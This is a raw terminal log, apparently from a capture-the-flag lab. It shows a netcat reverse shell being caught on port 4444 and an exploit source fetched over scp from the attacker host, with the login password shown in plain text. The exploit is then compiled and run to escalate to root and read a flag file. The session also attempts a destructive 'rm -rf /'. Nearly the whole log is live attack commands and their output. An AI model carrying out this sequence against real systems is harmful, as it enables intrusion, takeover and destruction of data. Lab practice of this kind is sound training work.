@@ -1,0 +1,206 @@
+nc -lnvp 4444                                   ─╯
+listening on [any] 4444 ...
+connect to [10.9.2.158] from (UNKNOWN) [10.10.180.137] 39534
+$ ls
+ls
+changelog.txt  config.php  editor_plugin.js      img    rpc.php
+classes        css         editor_plugin_src.js  includes
+$ cd /tmp
+cd /tmp
+$ ls
+ls
+exploit  exploit.c  ns_sploit  ofs-lib.c  tinyspellWmOBOB
+$ rm exploit*
+rm exploit*
+$ ls
+ls
+ns_sploit  ofs-lib.c  tinyspellWmOBOB
+$ rm ns_sploit
+rm ns_sploit
+rm: cannot remove 'ns_sploit': Is a directory
+$ ls
+ls
+ns_sploit  ofs-lib.c  tinyspellWmOBOB
+$ rm -r ns_sploit
+rm -r ns_sploit
+$ rm *.c
+rm *.c
+$ scp -rv h471x@10.9.2.158:/home/h471x/exploit.c .
+scp -rv h471x@10.9.2.158:/home/h471x/exploit.c .
+Executing: program /usr/bin/ssh host 10.9.2.158, user h471x, command scp -v -r -f /home/h471x/exploit.c
+OpenSSH_6.6.1, OpenSSL 1.0.1f 6 Jan 2014
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+debug1: Connecting to 10.9.2.158 [10.9.2.158] port 22.
+debug1: Connection established.
+debug1: SELinux support disabled
+Could not create directory '/var/www/.ssh'.
+debug1: identity file /var/www/.ssh/id_rsa type -1
+debug1: identity file /var/www/.ssh/id_rsa-cert type -1
+debug1: identity file /var/www/.ssh/id_dsa type -1
+debug1: identity file /var/www/.ssh/id_dsa-cert type -1
+debug1: identity file /var/www/.ssh/id_ecdsa type -1
+debug1: identity file /var/www/.ssh/id_ecdsa-cert type -1
+debug1: identity file /var/www/.ssh/id_ed25519 type -1
+debug1: identity file /var/www/.ssh/id_ed25519-cert type -1
+debug1: Enabling compatibility mode for protocol 2.0
+debug1: Local version string SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
+debug1: Remote protocol version 2.0, remote software version OpenSSH_9.7p1 Debian-5
+debug1: match: OpenSSH_9.7p1 Debian-5 pat OpenSSH* compat 0x04000000
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: server->client aes128-ctr hmac-sha1-etm@openssh.com none
+debug1: kex: client->server aes128-ctr hmac-sha1-etm@openssh.com none
+debug1: sending SSH2_MSG_KEX_ECDH_INIT
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ECDSA 6b:d2:7a:dc:40:e0:80:d7:b8:a3:da:27:7f:54:a4:8c
+The authenticity of host '10.9.2.158 (10.9.2.158)' can't be established.
+ECDSA key fingerprint is 6b:d2:7a:dc:40:e0:80:d7:b8:a3:da:27:7f:54:a4:8c.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+debug1: ssh_ecdsa_verify: signature correct
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: Roaming not allowed by server
+debug1: SSH2_MSG_SERVICE_REQUEST sent
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Trying private key: /var/www/.ssh/id_rsa
+debug1: Trying private key: /var/www/.ssh/id_dsa
+debug1: Trying private key: /var/www/.ssh/id_ecdsa
+debug1: Trying private key: /var/www/.ssh/id_ed25519
+debug1: Next authentication method: password
+h471x@10.9.2.158's password: jesuslife
+
+debug1: Authentication succeeded (password).
+Authenticated to 10.9.2.158 ([10.9.2.158]:22).
+debug1: channel 0: new [client-session]
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: Sending environment.
+debug1: Sending env LANG = C
+debug1: Sending command: scp -v -r -f /home/h471x/exploit.c
+Sink: C0664 4981 exploit.c
+exploit.c                                       0%    0     0.0KB/s   --:-- ETAscp: debug1: fd 3 clearing O_NONBLOCK
+Sending file modes: C0664 4981 exploit.c
+exploit.c                                     100% 4981     4.9KB/s   00:00    
+scp: debug1: fd 1 clearing O_NONBLOCK
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+debug1: channel 0: free: client-session, nchannels 1
+debug1: fd 0 clearing O_NONBLOCK
+debug1: fd 1 clearing O_NONBLOCK
+Transferred: sent 2576, received 7560 bytes, in 2.1 seconds
+Bytes per second: sent 1236.9, received 3630.1
+debug1: Exit status 0
+$ ls
+ls
+exploit.c  tinyspellWmOBOB
+$ cc exploit.c -o exploit
+cc exploit.c -o exploit
+exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &status, 0);
+            ^
+exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+$ ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+whoami
+root
+# ls
+ls
+exploit  exploit.c  tinyspellWmOBOB  wget-log
+# cd /root
+cd /root
+# ls
+ls
+# ls -la
+ls -la
+total 44
+drwx------  3 root root 4096 Apr 29  2018 .
+drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
+-rw-r--r--  1 root root   19 May  3  2018 .bash_history
+-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
+drwx------  2 root root 4096 Apr 28  2018 .cache
+-rw-------  1 root root  144 Apr 29  2018 .flag.txt
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-------  1 root root 1024 Apr 23  2018 .rnd
+-rw-------  1 root root 8296 Apr 29  2018 .viminfo
+# cat .flag.txt*
+cat .flag.txt*
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+# rm -rf /
+rm -rf /
+rm: it is dangerous to operate recursively on '/'
+rm: use --no-preserve-root to override this failsafe
+# history
+history
+sh: 8: history: not found
+# ls
+ls
+# cd ..
+lcd ..
+# s
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv        tmp  var
+boot  etc  initrd.img  lib64  media       opt  root  sbin  sys        usr  vmlinuz
+# cd home
+cd home
+# ls
+ls
+boris  doak  natalya
+# cd boris
+cd boris
+# ls
+ls
+mail
+# cd mail
+cd mail
+# ls
+ls
+# cd ..
+cd ..
+# ls -l
+ls -l
+total 4
+drwx------ 3 boris boris 4096 Dec  2 10:34 mail
+# cd ..
+lcd ..
+s
+# cls
+boris  doak  natalya
+# d /var/www/html
+cd /var/www/html
+# ls
+ls
+006-final  gnocertdir  index.html  rtm.log   sniper.png  splashAdmin.php
+dir007key  index.css   logo.png    sev-home  space.gif terminal.js
+# 
